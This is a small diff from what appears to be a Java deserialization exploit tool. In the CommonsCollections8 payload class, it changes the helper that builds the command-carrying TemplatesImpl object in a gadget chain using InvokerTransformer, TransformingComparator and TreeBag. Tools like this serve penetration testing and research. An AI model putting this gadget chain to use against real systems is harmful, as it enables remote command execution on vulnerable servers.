@@ -19,7 +19,7 @@ public class CommonsCollections8 implements CommandObjectPayload<TreeBag>
 {
 
 	public TreeBag getObject(String command) throws Exception {
-		Object                 templates   = Gadgets.createTemplatesImpl(command);
+		Object                 templates   = Gadgets.createTemplates4Cmd(command);
 		InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 		TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
 		TreeBag                tree        = new TreeBag((Comparator) comp);
